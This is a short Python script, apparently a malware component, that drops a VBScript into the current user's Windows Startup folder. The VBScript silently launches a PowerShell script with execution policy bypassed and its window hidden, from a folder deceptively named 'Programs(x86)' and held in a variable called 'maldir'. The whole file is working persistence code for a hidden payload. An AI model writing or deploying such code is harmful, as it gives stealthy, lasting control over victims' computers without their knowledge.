import os
ps1name = "powershell.ps1"
startup = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
udir = os.path.expanduser("~")
maldir = "Programs(x86)"
mdir = (f"{udir}\\{maldir}")
vbsname = "vbscript.vbs"
vbs = f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""{mdir}\\{ps1name}""", 0, True'
try:
    with open(f"{udir}\\{startup}\\{vbsname}","w") as f:
        f.write(vbs)
except FileExistsError:
    pass